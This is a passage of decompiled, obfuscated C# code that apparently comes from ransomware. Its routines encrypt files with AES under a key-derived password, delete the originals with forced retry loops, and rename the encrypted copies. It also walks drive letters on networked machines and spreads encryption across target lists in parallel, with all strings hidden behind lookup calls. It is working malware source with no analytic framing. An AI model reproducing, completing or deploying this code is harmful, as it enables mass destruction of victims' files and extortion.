										qxGcsYEaEgSP(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!CVCyEBDPJVibYms)
										{
											plvpumDZMr(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, xdThOOfnYmOX);
										}
										else
										{
											plvpumDZMr(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex9)
									{
										if (JJYUPCZGaGN)
										{
											try
											{
												File.AppendAllText(vzSBJQFXpb, QaTaQbhILmx.getString_0(107378806) + CS_0024_003C_003E8__locals0.BGIywWvGkY + QaTaQbhILmx.getString_0(107378001) + ex9.Message + QaTaQbhILmx.getString_0(107397174));
											}
											catch (Exception)
											{
											}
										}
										AmOSyvkYqZhk++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.BGIywWvGkY + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, CS_0024_003C_003E8__locals0.BGIywWvGkY);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!DCETDGmAEgibl)
							{
								if (!CVCyEBDPJVibYms)
								{
									qxGcsYEaEgSP(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + QaTaQbhILmx.getString_0(107378042), xdThOOfnYmOX);
								}
								else
								{
									qxGcsYEaEgSP(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + QaTaQbhILmx.getString_0(107378042), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!CVCyEBDPJVibYms)
									{
										plvpumDZMr(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY, xdThOOfnYmOX);
									}
									else
									{
										plvpumDZMr(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex12)
								{
									if (JJYUPCZGaGN)
									{
										try
										{
											File.AppendAllText(vzSBJQFXpb, QaTaQbhILmx.getString_0(107378806) + CS_0024_003C_003E8__locals0.BGIywWvGkY + QaTaQbhILmx.getString_0(107378001) + ex12.Message + QaTaQbhILmx.getString_0(107397174));
										}
										catch (Exception)
										{
										}
									}
									AmOSyvkYqZhk++;
									return;
								}
							}
							if (CVCyEBDPJVibYms)
							{
								if (CS_0024_003C_003E8__locals0.IUsTjCWCoatx != QaTaQbhILmx.getString_0(107378047))
								{
									emEmxwYCVRMX(CS_0024_003C_003E8__locals0.BGIywWvGkY + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, bytes2);
								}
								else
								{
									emEmxwYCVRMX(CS_0024_003C_003E8__locals0.BGIywWvGkY, bytes2);
								}
							}
						}
						end_IL_0656_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0df4;
			IL_0df4:
			CS_0024_003C_003E8__locals0.dDmITDjvmcD.Remove(CS_0024_003C_003E8__locals0.BGIywWvGkY);
		});
	}

	private static void euuwNJcsNndXOO(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (bdRzRfVgdufg == getString_0(107396927))
					{
						foreach (string item in WIlNSOXrZeC)
						{
							if (string_0.ToLower().EndsWith(item) && PIdfVhNVvVogR == getString_0(107396927))
							{
								if (Convert.ToInt32(zshVWAjTCa) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										UuDMKkzrJStt.xLFYxlCXWb(getString_0(107350584), getString_0(107350579), getString_0(107350598), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && PIdfVhNVvVogR == getString_0(107396844))
							{
								try
								{
									UuDMKkzrJStt.xLFYxlCXWb(getString_0(107350584), getString_0(107350579), getString_0(107350598), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107378022)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107378022), getString_0(107350535)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void plvpumDZMr(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (bdRzRfVgdufg == getString_0(107396927))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in WIlNSOXrZeC)
			{
				if (string_0.ToLower().EndsWith(item) && PIdfVhNVvVogR == getString_0(107396927))
				{
					if (Convert.ToInt32(zshVWAjTCa) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							UuDMKkzrJStt.xLFYxlCXWb(getString_0(107350584), getString_0(107350579), getString_0(107350598), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && PIdfVhNVvVogR == getString_0(107396844))
				{
					try
					{
						UuDMKkzrJStt.xLFYxlCXWb(getString_0(107350584), getString_0(107350579), getString_0(107350598), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = ivMVFneIiiSs.QBYVYTkGHVQKD(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		ytQePvltMhp++;
	}

	private static void qxGcsYEaEgSP(string string_0, string string_1, byte[] byte_0)
	{
		OBNDhcKjAFhYUGN CS_0024_003C_003E8__locals0 = new OBNDhcKjAFhYUGN();
		CS_0024_003C_003E8__locals0.zbgcGgYGLQQxYE = string_0;
		CS_0024_003C_003E8__locals0.sdhvywEqGWLI = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string sdhvywEqGWLI = CS_0024_003C_003E8__locals0.sdhvywEqGWLI;
			FileStream fileStream = new FileStream(sdhvywEqGWLI, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (cdzmoqFlfITSP == getString_0(107396927))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.zbgcGgYGLQQxYE, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.zbgcGgYGLQQxYE, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.zbgcGgYGLQQxYE, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.sdhvywEqGWLI.Length > 0)
				{
					if (bdRzRfVgdufg == getString_0(107396927))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.zbgcGgYGLQQxYE, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in WIlNSOXrZeC)
						{
							if (CS_0024_003C_003E8__locals0.zbgcGgYGLQQxYE.ToLower().EndsWith(item) && PIdfVhNVvVogR == getString_0(107396927))
							{
								if (Convert.ToInt32(zshVWAjTCa) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										UuDMKkzrJStt.xLFYxlCXWb(getString_0(107350584), getString_0(107350579), getString_0(107350598), CS_0024_003C_003E8__locals0.zbgcGgYGLQQxYE);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.zbgcGgYGLQQxYE.ToLower().EndsWith(item) && PIdfVhNVvVogR == getString_0(107396844))
							{
								try
								{
									UuDMKkzrJStt.xLFYxlCXWb(getString_0(107350584), getString_0(107350579), getString_0(107350598), CS_0024_003C_003E8__locals0.zbgcGgYGLQQxYE);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.zbgcGgYGLQQxYE);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.sdhvywEqGWLI.EndsWith(getString_0(107378022)))
					{
						File.Move(CS_0024_003C_003E8__locals0.sdhvywEqGWLI, CS_0024_003C_003E8__locals0.sdhvywEqGWLI.Replace(getString_0(107378022), getString_0(107350535)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.sdhvywEqGWLI))
							{
								File.Delete(CS_0024_003C_003E8__locals0.sdhvywEqGWLI);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (JJYUPCZGaGN)
			{
				try
				{
					File.AppendAllText(vzSBJQFXpb, getString_0(107378786) + CS_0024_003C_003E8__locals0.zbgcGgYGLQQxYE + getString_0(107377981) + ex2.Message + getString_0(107397154));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> source = tYWpKAuFUmGf;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107377960)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		List<string> source2 = ifTEDxlMnuTZQ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107377915)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		if (cJaDcuvoWf == getString_0(107396927))
		{
			string[] juuHnIfwBa = JuuHnIfwBa;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107377915)), getString_0(107377922) + string_0 + getString_0(107377881));
				};
			}
			Parallel.ForEach(juuHnIfwBa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		if (!fzBOSVsSHwJOy().Contains(getString_0(107378620)))
		{
			rrqSgYKwbeTjR(wkEmfSxwmzT);
		}
		else
		{
			List<string> kXhXGePQDEZDL = KXhXGePQDEZDL;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
				{
					sroZTJGCRhFP(gvCYkntYkqMW(jCEtgwbUwXnV(getString_0(107377876))), string_0);
				};
			}
			Parallel.ForEach(kXhXGePQDEZDL, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		}
		List<string> source3 = uNUvSMAaNbE;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107377851)), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107377960)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107377915)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107377915)), getString_0(107377922) + string_0 + getString_0(107377881));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		sroZTJGCRhFP(gvCYkntYkqMW(jCEtgwbUwXnV(getString_0(107377876))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107377851)), string_0);
	}

	private static void _003CMapDrv_003Eb__18(string string_0)
	{
		RnVSXGpvaRmkK CS_0024_003C_003E8__locals0 = new RnVSXGpvaRmkK();
		CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX = string_0;
		if ((!CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX.StartsWith(getString_0(107377866)) && !CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX.StartsWith(getString_0(107377861)) && !CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX.StartsWith(getString_0(107377820)) && !CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX.StartsWith(getString_0(107377839))) || !TaboJirPIvtr.yThKTqJWNfEEXwD(CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX))
		{
			return;
		}
		try
		{
			Thread.Sleep(ywMnaFcwkyBX);
			RSEYqZQHxTlgU.Add(getString_0(107348797) + CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX + getString_0(107377830));
			try
			{
				if (WmRKwcdDWVtNion)
				{
					Console.WriteLine(getString_0(107348797) + CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX + getString_0(107377830));
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
				Thread.Sleep(ywMnaFcwkyBX);
				RSEYqZQHxTlgU.Add(RnVSXGpvaRmkK.getString_0(107348803) + CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX + RnVSXGpvaRmkK.getString_0(107396823) + (char)int_0 + RnVSXGpvaRmkK.getString_0(107459764));
				try
				{
					if (WmRKwcdDWVtNion)
					{
						Console.WriteLine(RnVSXGpvaRmkK.getString_0(107348803) + CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX + RnVSXGpvaRmkK.getString_0(107396823) + (char)int_0 + RnVSXGpvaRmkK.getString_0(107459764));
					}
				}
				catch
				{
				}
			});
		}
		catch
		{
		}
	}

	static bTJSgdVkQM()
	{
		Strings.CreateGetStringDelegate(typeof(bTJSgdVkQM));
		ONQHMlPKrvSNNg = getString_0(107349655);
		xdThOOfnYmOX = null;
		txqzvgdCEQF = getString_0(107396844);
		HYSHgMyGCmRaP = getString_0(107377789);
		RSEYqZQHxTlgU = new List<string>();
		uNOGqJxLgNfEx = new List<string>();
		mZiPlbMxvKjMRh = getString_0(107396844);
		ARnvboqDJfB = getString_0(107350535);
		RXJEMuLOvPXmM = getString_0(107350535);
		DwcBIhdaeLV = getString_0(107396844);
		KgkvqSJQtZ = 0;
		uvAbidagcyNet = getString_0(107396927);
		WFeWWtxpadDRhJK = getString_0(107396844);
		MgsxbQhNsveGhtg = getString_0(107396844);
		ZVkrmhCmleabiHT = getString_0(107377808);
		CiWdTHwrdzkSneJ = getString_0(107396844);
		xtIYXPvbuIJEP = getString_0(107396844);
		ojKSSztKIGB = getString_0(107396844);
		VoYOPMaGaMnOVDFyi = getString_0(107396844);
		nmdgopXGYgo = new List<string>
		{
			gvCYkntYkqMW(getString_0(107377803)),
			gvCYkntYkqMW(getString_0(107378266)),
			gvCYkntYkqMW(getString_0(107378273)),
			gvCYkntYkqMW(getString_0(107378256)),
			gvCYkntYkqMW(getString_0(107378199)),
			gvCYkntYkqMW(getString_0(107378174)),
			gvCYkntYkqMW(getString_0(107378189)),
			gvCYkntYkqMW(getString_0(107378132)),
			gvCYkntYkqMW(getString_0(107378107)),
			gvCYkntYkqMW(getString_0(107378114)),
			gvCYkntYkqMW(getString_0(107378065)),
			gvCYkntYkqMW(getString_0(107378040)),
			gvCYkntYkqMW(getString_0(107377503))
		};
		LvCohppTPrblek = new List<string>();
		LsrmgCBKEL = getString_0(107396927);
		TyifAvgdwt = getString_0(107396844);
		xomQQmIXYWpclvF = getString_0(107396844);
		GfJosmTooKpZJP = new List<string>();
		blZTtpgnxEegy = getString_0(107396844);
		wzfKLpsdfNdrT = getString_0(107377510);
		GUXQCPvWRuYo = getString_0(107396927);
		iNcHwTAiwxSbGa = getString_0(107396844);
		zwooCDGxcVUnvYgCk = new List<string>
		{
			gvCYkntYkqMW(getString_0(107377429)),
			gvCYkntYkqMW(getString_0(107377396)),
			gvCYkntYkqMW(getString_0(107377363)),
			gvCYkntYkqMW(getString_0(107377330)),
			gvCYkntYkqMW(getString_0(107377297)),
			gvCYkntYkqMW(getString_0(107377268)),
			gvCYkntYkqMW(getString_0(107377723)),
			gvCYkntYkqMW(getString_0(107377694)),
			gvCYkntYkqMW(getString_0(107377649)),
			gvCYkntYkqMW(getString_0(107377616)),
			gvCYkntYkqMW(getString_0(107377583)),
			gvCYkntYkqMW(getString_0(107377550)),
			gvCYkntYkqMW(getString_0(107377005)),
			gvCYkntYkqMW(getString_0(107376976)),
			gvCYkntYkqMW(getString_0(107376915)),
			gvCYkntYkqMW(getString_0(107376906)),
			gvCYkntYkqMW(getString_0(107376865)),
			gvCYkntYkqMW(getString_0(107376808)),
			gvCYkntYkqMW(getString_0(107377239)),
			gvCYkntYkqMW(getString_0(107377206)),
			gvCYkntYkqMW(getString_0(107377177)),
			gvCYkntYkqMW(getString_0(107377168)),
			gvCYkntYkqMW(getString_0(107377127)),
			gvCYkntYkqMW(getString_0(107377094)),
			gvCYkntYkqMW(getString_0(107377013)),
			gvCYkntYkqMW(getString_0(107376444)),
			gvCYkntYkqMW(getString_0(107376403)),
			gvCYkntYkqMW(getString_0(107376374)),
			gvCYkntYkqMW(getString_0(107376365)),
			gvCYkntYkqMW(getString_0(107376276)),
			gvCYkntYkqMW(getString_0(107376723)),
			gvCYkntYkqMW(getString_0(107376666)),
			gvCYkntYkqMW(getString_0(107376601)),
			gvCYkntYkqMW(getString_0(107376584)),
			gvCYkntYkqMW(getString_0(107376519)),
			gvCYkntYkqMW(getString_0(107375950)),
			gvCYkntYkqMW(getString_0(107375917)),
			gvCYkntYkqMW(getString_0(107375876)),
			gvCYkntYkqMW(getString_0(107375803)),
			gvCYkntYkqMW(getString_0(107375790)),
			gvCYkntYkqMW(getString_0(107375729)),
			gvCYkntYkqMW(getString_0(107376208)),
			gvCYkntYkqMW(getString_0(107376167)),
			gvCYkntYkqMW(getString_0(107376134)),
			gvCYkntYkqMW(getString_0(107376061)),
			gvCYkntYkqMW(getString_0(107376044)),
			gvCYkntYkqMW(getString_0(107375455)),
			gvCYkntYkqMW(getString_0(107375382)),
			gvCYkntYkqMW(getString_0(107375369)),
			gvCYkntYkqMW(getString_0(107375292)),
			gvCYkntYkqMW(getString_0(107375279)),
			gvCYkntYkqMW(getString_0(107375238)),
			gvCYkntYkqMW(getString_0(107375645)),
			gvCYkntYkqMW(getString_0(107375616)),
			gvCYkntYkqMW(getString_0(107375575)),
			gvCYkntYkqMW(getString_0(107375510)),
			gvCYkntYkqMW(getString_0(107375497)),
			gvCYkntYkqMW(getString_0(107374956)),
			gvCYkntYkqMW(getString_0(107374879)),
			gvCYkntYkqMW(getString_0(107374814)),
			gvCYkntYkqMW(getString_0(107374817)),
			gvCYkntYkqMW(getString_0(107374760)),
			gvCYkntYkqMW(getString_0(107375207)),
			gvCYkntYkqMW(getString_0(107375134)),
			gvCYkntYkqMW(getString_0(107375137)),
			gvCYkntYkqMW(getString_0(107375064)),
			gvCYkntYkqMW(getString_0(107375015)),
			gvCYkntYkqMW(getString_0(107374442)),
			gvCYkntYkqMW(getString_0(107374369)),
			gvCYkntYkqMW(getString_0(107374292)),
			gvCYkntYkqMW(getString_0(107374259)),
			gvCYkntYkqMW(getString_0(107374250)),
			gvCYkntYkqMW(getString_0(107374653)),
			gvCYkntYkqMW(getString_0(107374640)),
			gvCYkntYkqMW(getString_0(107374519)),
			gvCYkntYkqMW(getString_0(107374502)),
			gvCYkntYkqMW(getString_0(107374473)),
			gvCYkntYkqMW(getString_0(107373888)),
			gvCYkntYkqMW(getString_0(107373823)),
			gvCYkntYkqMW(getString_0(107373806)),
			gvCYkntYkqMW(getString_0(107373717)),
			gvCYkntYkqMW(getString_0(107373684)),
			gvCYkntYkqMW(getString_0(107374135)),
			gvCYkntYkqMW(getString_0(107374078)),
			gvCYkntYkqMW(getString_0(107375950)),
			gvCYkntYkqMW(getString_0(107374053)),
			gvCYkntYkqMW(getString_0(107373980)),
			gvCYkntYkqMW(getString_0(107373411)),
			gvCYkntYkqMW(getString_0(107373334)),
			gvCYkntYkqMW(getString_0(107373273)),
			gvCYkntYkqMW(getString_0(107373248)),
			gvCYkntYkqMW(getString_0(107373203)),
			gvCYkntYkqMW(getString_0(107373186)),
			gvCYkntYkqMW(getString_0(107376276)),
			gvCYkntYkqMW(getString_0(107373633)),
			gvCYkntYkqMW(getString_0(107373560)),
			gvCYkntYkqMW(getString_0(107373503)),
			gvCYkntYkqMW(getString_0(107376723)),
			gvCYkntYkqMW(getString_0(107373430)),
			gvCYkntYkqMW(getString_0(107372901)),
			gvCYkntYkqMW(getString_0(107372812)),
			gvCYkntYkqMW(getString_0(107372747)),
			gvCYkntYkqMW(getString_0(107372666)),
			gvCYkntYkqMW(getString_0(107376601)),
			gvCYkntYkqMW(getString_0(107373133)),
			gvCYkntYkqMW(getString_0(107375917)),
			gvCYkntYkqMW(getString_0(107376584)),
			gvCYkntYkqMW(getString_0(107373100)),
			gvCYkntYkqMW(getString_0(107373011)),
			gvCYkntYkqMW(getString_0(107376519)),
			gvCYkntYkqMW(getString_0(107372978)),
			gvCYkntYkqMW(getString_0(107372961)),
			gvCYkntYkqMW(getString_0(107372400)),
			gvCYkntYkqMW(getString_0(107376365)),
			gvCYkntYkqMW(getString_0(107372343)),
			gvCYkntYkqMW(getString_0(107372330)),
			gvCYkntYkqMW(getString_0(107372301)),
			gvCYkntYkqMW(getString_0(107372272)),
			gvCYkntYkqMW(getString_0(107372227)),
			gvCYkntYkqMW(getString_0(107372194)),
			gvCYkntYkqMW(getString_0(107372169)),
			gvCYkntYkqMW(getString_0(107372604)),
			gvCYkntYkqMW(getString_0(107372611)),
			gvCYkntYkqMW(getString_0(107372538)),
			gvCYkntYkqMW(getString_0(107372525)),
			gvCYkntYkqMW(getString_0(107372444)),
			gvCYkntYkqMW(getString_0(107372419)),
			gvCYkntYkqMW(getString_0(107371874)),
			gvCYkntYkqMW(getString_0(107371797)),
			gvCYkntYkqMW(getString_0(107371764)),
			gvCYkntYkqMW(getString_0(107371755)),
			gvCYkntYkqMW(getString_0(107376374)),
			gvCYkntYkqMW(getString_0(107372444)),
			gvCYkntYkqMW(getString_0(107371714)),
			gvCYkntYkqMW(getString_0(107371685)),
			gvCYkntYkqMW(getString_0(107371656)),
			gvCYkntYkqMW(getString_0(107372087)),
			gvCYkntYkqMW(getString_0(107372078)),
			gvCYkntYkqMW(getString_0(107371985)),
			gvCYkntYkqMW(getString_0(107371944)),
			gvCYkntYkqMW(getString_0(107371915)),
			gvCYkntYkqMW(getString_0(107371370)),
			gvCYkntYkqMW(getString_0(107371297)),
			gvCYkntYkqMW(getString_0(107371268)),
			gvCYkntYkqMW(getString_0(107371191)),
			gvCYkntYkqMW(getString_0(107371126)),
			gvCYkntYkqMW(getString_0(107371605)),
			gvCYkntYkqMW(getString_0(107371592)),
			gvCYkntYkqMW(getString_0(107371531)),
			gvCYkntYkqMW(getString_0(107371498)),
			gvCYkntYkqMW(getString_0(107371421)),
			gvCYkntYkqMW(getString_0(107370844)),
			gvCYkntYkqMW(getString_0(107370811)),
			gvCYkntYkqMW(getString_0(107370770)),
			gvCYkntYkqMW(getString_0(107370753)),
			gvCYkntYkqMW(getString_0(107377013)),
			gvCYkntYkqMW(getString_0(107370724)),
			gvCYkntYkqMW(getString_0(107370667)),
			gvCYkntYkqMW(getString_0(107370626)),
			gvCYkntYkqMW(getString_0(107371061)),
			gvCYkntYkqMW(getString_0(107371052)),
			gvCYkntYkqMW(getString_0(107370975)),
			gvCYkntYkqMW(getString_0(107370946)),
			gvCYkntYkqMW(getString_0(107370865)),
			gvCYkntYkqMW(getString_0(107370304)),
			gvCYkntYkqMW(getString_0(107370279)),
			gvCYkntYkqMW(getString_0(107370222)),
			gvCYkntYkqMW(getString_0(107370177)),
			gvCYkntYkqMW(getString_0(107370104)),
			gvCYkntYkqMW(getString_0(107370559)),
			gvCYkntYkqMW(getString_0(107376444)),
			gvCYkntYkqMW(getString_0(107370486)),
			gvCYkntYkqMW(getString_0(107370457)),
			gvCYkntYkqMW(getString_0(107370424)),
			gvCYkntYkqMW(getString_0(107370415)),
			gvCYkntYkqMW(getString_0(107370354)),
			gvCYkntYkqMW(getString_0(107377094)),
			gvCYkntYkqMW(getString_0(107369833)),
			gvCYkntYkqMW(getString_0(107369752)),
			gvCYkntYkqMW(getString_0(107369723)),
			gvCYkntYkqMW(getString_0(107374817)),
			gvCYkntYkqMW(getString_0(107369690)),
			gvCYkntYkqMW(getString_0(107369723)),
			gvCYkntYkqMW(getString_0(107369661)),
			gvCYkntYkqMW(getString_0(107369632)),
			gvCYkntYkqMW(getString_0(107369635)),
			gvCYkntYkqMW(getString_0(107370066)),
			gvCYkntYkqMW(getString_0(107370049)),
			gvCYkntYkqMW(getString_0(107369976)),
			gvCYkntYkqMW(getString_0(107369915)),
			gvCYkntYkqMW(getString_0(107369886)),
			gvCYkntYkqMW(getString_0(107369845)),
			gvCYkntYkqMW(getString_0(107369320)),
			gvCYkntYkqMW(getString_0(107369243)),
			gvCYkntYkqMW(getString_0(107369210)),
			gvCYkntYkqMW(getString_0(107369185)),
			gvCYkntYkqMW(getString_0(107369108)),
			gvCYkntYkqMW(getString_0(107369563)),
			gvCYkntYkqMW(getString_0(107369530)),
			gvCYkntYkqMW(getString_0(107369489)),
			gvCYkntYkqMW(getString_0(107369460)),
			gvCYkntYkqMW(getString_0(107369399)),
			gvCYkntYkqMW(getString_0(107369366)),
			gvCYkntYkqMW(getString_0(107368797)),
			gvCYkntYkqMW(getString_0(107368756)),
			gvCYkntYkqMW(getString_0(107368739)),
			gvCYkntYkqMW(getString_0(107368706)),
			gvCYkntYkqMW(getString_0(107368625)),
			gvCYkntYkqMW(getString_0(107368612)),
			gvCYkntYkqMW(getString_0(107369043)),
			gvCYkntYkqMW(getString_0(107369030)),
			gvCYkntYkqMW(getString_0(107368949)),
			gvCYkntYkqMW(getString_0(107368916)),
			gvCYkntYkqMW(getString_0(107368907)),
			gvCYkntYkqMW(getString_0(107368866)),
			gvCYkntYkqMW(getString_0(107368277)),
			gvCYkntYkqMW(getString_0(107372078)),
			gvCYkntYkqMW(getString_0(107368244)),
